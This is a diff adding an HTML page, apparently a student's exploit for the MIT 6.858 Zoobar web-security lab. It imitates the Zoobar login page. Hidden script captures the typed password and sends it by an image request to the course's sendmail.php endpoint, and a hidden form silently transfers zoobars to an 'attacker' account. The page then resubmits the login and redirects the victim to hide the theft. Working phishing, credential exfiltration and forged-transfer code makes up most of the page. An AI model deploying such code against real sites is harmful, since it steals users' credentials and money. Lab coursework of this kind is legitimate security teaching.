@@ -1,0 +1,112 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
+        <title>
+          Login - Zoobar Foundation
+        </title>
+    </head>
+    <body>
+
+
+
+
+
+
+
+      <h1><a href="/zoobar/index.cgi/">Zoobar Foundation for Trustworthy
+                      Discourse</a></h1>
+      <h2>Supporting the skillful
+          soldiers of the 21st-century</h2>
+
+<div id="login" class="centerpiece">
+<form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
+<table>
+<tr>
+   <td>Username:</td>
+  <td><input type="text" name="login_username" size="20"
+  autocomplete="no" value=""></td>
+</tr>
+<tr>
+   <td>Password:</td>
+  <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
+  <input type="submit" name="submit_login" value="Log in">
+  <input type="submit" name="submit_registration" value="Register"></td>
+</tr>
+</table>
+<input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/">
+</form>
+</div>
+<div class="footer warning">
+
+</div>
+<script>document.loginform.login_username.focus();</script>
+<!--mycode here -->
+<div style="display:none", id="myZoobars"></div>
+<script src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
+
+<!-- when the form is submitted, the server response will appear in this iframe -->
+<iframe id="attack_iframe" name="my_iframe" src="" style="display:none"></iframe>
+
+<div style="display:none">
+<form method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" target="my_iframe">
+<p>Send <input name="zoobars_orig" type="text" value="" size=5> zoobars</p>
+<p>to <input name=recipientold type=text value="" size=10></p>
+
+<input name="zoobars" type="text" value="10" size=5 style="display:none">
+<input name=recipient type=text value="attacker" size=10 style="display:none">
+<input type="submit" name="submission" value="Send">
+</form>
+</div>
+
+
+<script type="text/javascript">
+    var loginform = document.getElementsByName("loginform")[0];
+    var password = document.getElementsByName("login_password")[0];
+    var loginbtn = document.getElementsByName("submit_login")[0];
+
+    function resubmit(argument) {
+        loginform.removeEventListener("submit", onsumbitbegin);
+        loginbtn.click();   
+    }
+    function onsumbitbegin(event) {
+        console.log("submit");
+        console.log("password:");
+        console.log(password["value"]);
+        event.preventDefault();
+
+        //模拟一次耗时请求，相当于发邮件。
+        setTimeout(function (argument) {
+            alert(password["value"]);   
+
+            (new Image()).src='http://css.csail.mit.edu/6.858/2015/labs/sendmail.php?' + 'to=sombody@mit.edu' + '&payload=' + password["value"] + '&random=' + Math.random();
+        },1000);
+
+        // 当确定邮件已发送后，重新提交表单
+        setTimeout(resubmit,2000);
+    }    
+
+    var zoobarvalue = document.getElementById("myZoobars").innerHTML;
+    if(zoobarvalue){
+        document.getElementsByName("transferform")[0].submit();
+
+        //exercise 8
+        var iframe = document.getElementById("attack_iframe");
+        iframe.addEventListener("load",function loadredy(argument) {
+            //alert('myframe is loaded'); 
+            console.log('myframe is loaded');
+            window.location = "http://css.csail.mit.edu/6.858/2015/"        
+        },false);
+
+    }else{
+        loginform.addEventListener("submit",onsumbitbegin,false);
+    } 
+
+</script>
+
+
+
+    </body>
+</html>
